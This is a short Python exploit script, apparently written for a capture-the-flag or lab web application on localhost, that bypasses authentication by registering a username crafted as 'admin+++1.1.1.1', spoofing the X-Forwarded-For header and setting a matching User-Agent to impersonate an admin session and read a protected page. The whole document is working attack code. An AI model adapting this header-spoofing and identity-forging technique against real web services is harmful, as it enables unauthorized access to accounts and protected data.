import requests

# Change URL and IP to match the real environment
base_url = "http://localhost:58903"
fake_forwarded_for = "1.1.1.1"

# Step 1: Register a user with a manipulated username and login
register_url = f"{base_url}/register"
register_data = {
    "username": f"admin+++{fake_forwarded_for}",
    "password": "password123"
}
response = requests.post(register_url, data=register_data)
print("Registration Response:", response.text)

login_url = f"{base_url}/login"
login_data = {
    "username": f"admin+++{fake_forwarded_for}",
    "password": "password123"
}
headers = {
    "User-Agent": "",
    "X-Forwarded-For": fake_forwarded_for
}
session = requests.Session()
response = session.post(login_url, data=login_data, headers=headers)

session_cookie = session.cookies["session"]
print("Obtained Session Cookie:", session_cookie)

# Step 2: Send a request with a manipulated User-Agent
headers = {
    "User-Agent": f"{fake_forwarded_for}+++",
    "X-Forwarded-For": fake_forwarded_for
}
protected_url = f"{base_url}/protected"
response = session.get(protected_url, headers=headers)
print("Protected Response:", response.text)
